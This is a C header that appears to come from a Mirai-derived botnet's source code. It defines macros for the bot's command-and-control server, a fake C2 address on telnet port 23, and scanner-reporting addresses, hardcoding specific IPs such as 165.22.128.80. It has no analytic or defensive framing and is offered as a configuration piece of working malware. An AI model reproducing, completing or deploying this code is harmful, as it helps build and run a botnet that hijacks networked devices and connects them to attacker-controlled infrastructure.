#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(176,123,26,89)
#define FAKE_CNC_PORT 23
/*                                                                 */
#ifndef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"165.22.128.80");
#define SERVIP (int)inet_addr((const char*)"165.22.128.80");

#else

#define SCANDOM "165.22.128.80"
#define SERVDOM "165.22.128.80"
#define SCANIP (int)inet_addr((const char*)"165.22.128.80");
#define SERVIP (int)inet_addr((const char*)"165.22.128.80");

#endif
/*                                                                 */   
ipv4_t LOCAL_ADDR;


